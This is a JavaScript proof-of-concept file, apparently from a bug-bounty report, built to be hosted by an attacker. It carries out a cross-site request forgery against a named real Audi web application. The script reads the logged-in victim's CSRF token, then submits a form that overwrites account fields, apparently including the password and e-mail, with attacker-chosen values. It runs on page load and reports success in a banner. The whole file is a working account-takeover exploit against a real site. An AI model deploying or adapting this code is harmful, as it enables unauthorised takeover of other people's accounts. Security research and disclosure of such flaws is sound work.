// csrf-poc.js - Host this on your server
(function() {
    'use strict';
    
    function getCSRFToken() {
        return new Promise((resolve, reject) => {
            fetch('https://osa2.audi.de/ve/ns_content.jsp', {
                credentials: 'include'
            })
            .then(response => response.text())
            .then(html => {
                const parser = new DOMParser();
                const doc = parser.parseFromString(html, 'text/html');
                const csrfInput = doc.querySelector('input[name="CSRFToken"]');
                if (csrfInput && csrfInput.value) {
                    resolve(csrfInput.value);
                } else {
                    reject('CSRF token not found');
                }
            })
            .catch(reject);
        });
    }
    
    function executeCSRFAttack(csrfToken) {
        const formData = new URLSearchParams();
        
        // Add base parameters
        const baseParams = {
            'dividerPos': '0',
            'mouseX': '1065',
            'mouseY': '280',
            'focusElement': 'userPasswordNew2',
            'browser': '-422d1c48:19acb3cc742:-7da6$1',
            'control': '43694',
            'event': 'click',
            'eventValue': '',
            'CSRFToken': csrfToken,
            'submit': 'Submit Query',
            'formScrollPos': '0',
            'domainScrollPos': '0'
        };
        
        // Add payload
        const payload = {
            'j_43697': 'nay',
            'j_43699': 'naysserkk',
            'j_43701': 'leo',
            'j_43704': 'naysser<',
            'j_43708': 'wearehackerone',
            'j_43710': '',
            'j_43715': 'naysser"',
            'j_43717': 'naysser@bugcrowdninja.com',
            'j_43719': '+1202654784',
            'j_43721': '',
            'j_43723': '',
            'j_43725': '',
            'j_43727': '',
            'j_43729': '',
            'j_43731': '',
            'j_43734': 'Wisdome@1992',
            'j_43736': 'Wisdome@1992',
            'j_43739': 'true',
            'j_43747': '',
            'j_43749': '0:0',
            'j_43761': '',
            'j_43688': '0',
            'j_43685': '0',
            'j_43695': 'Frau'
        };
        
        // Combine all parameters
        Object.keys(baseParams).forEach(key => formData.append(key, baseParams[key]));
        Object.keys(payload).forEach(key => formData.append(key, payload[key]));
        
        return fetch('https://osa2.audi.de/ve/ns_content.jsp', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: formData,
            credentials: 'include'
        });
    }
    
    function showResult(status) {
        const notification = document.createElement('div');
        notification.style.cssText = `
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: #ff4444;
            color: white;
            padding: 15px 20px;
            border-radius: 5px;
            z-index: 10000;
            font-family: Arial, sans-serif;
            font-size: 14px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.3);
        `;
        notification.innerHTML = `🚨 CSRF PoC Executed! Status: ${status}`;
        document.body.appendChild(notification);
        
        setTimeout(() => {
            if (document.body.contains(notification)) {
                document.body.removeChild(notification);
            }
        }, 5000);
    }
    
    // Main execution
    getCSRFToken()
        .then(csrfToken => {
            console.log('CSRF Token obtained:', csrfToken);
            return executeCSRFAttack(csrfToken);
        })
        .then(response => {
            console.log('CSRF Attack completed. Status:', response.status);
            showResult(response.status);
        })
        .catch(error => {
            console.error('CSRF Attack failed:', error);
            showResult('Failed: ' + error);
        });
})();
